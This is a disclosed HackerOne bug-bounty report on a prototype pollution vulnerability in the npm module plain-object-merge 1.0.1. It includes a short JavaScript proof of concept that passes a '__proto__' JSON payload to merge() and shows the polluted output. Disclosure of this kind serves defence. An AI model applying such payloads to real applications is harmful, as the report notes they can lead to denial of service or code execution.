# [plain-object-merge] Prototype pollution

## Report Details
- **Report ID**: 871156
- **URL**: https://hackerone.com/reports/871156
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-05-11T22:23:34.390Z
- **Disclosed**: 2021-03-13T19:30:53.402Z

## Reporter
- **Username**: d3lla
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `prototype pollution` vulnerability in `plain-object-merge` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `plain-object-merge`
**version:** `1.0.1`
**npm page:** `https://www.npmjs.com/package/plain-object-merge`

## Module Description

Extremely fast function optimized for deep merging json-serializable plain objects.

## Module Stats

[20] weekly downloads

# Vulnerability

## Vulnerability Description

The `merge` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `plain-object-merge` module:
    - `npm i plain-object-merge`

Create an object with `__proto__` property and pass it to the `merge` function:
```javascript

const merge = require('plain-object-merge');
const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
const obj = {};
console.log("Before : " + obj.polluted);
merge([{}, payload]);
console.log("After : " + obj.polluted);
```
Output:
```console

Before : undefined
After : yes
```
{F824411}

## Supporting Material/References:

- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS
- NODEJS VERSION: v14.1.0
- NPM VERSION: 6.14.5

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 


Thank you for your time.

best regards,

d3lla

## Impact

The impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.

## Attachments
- plain-object-merge_poc.mov
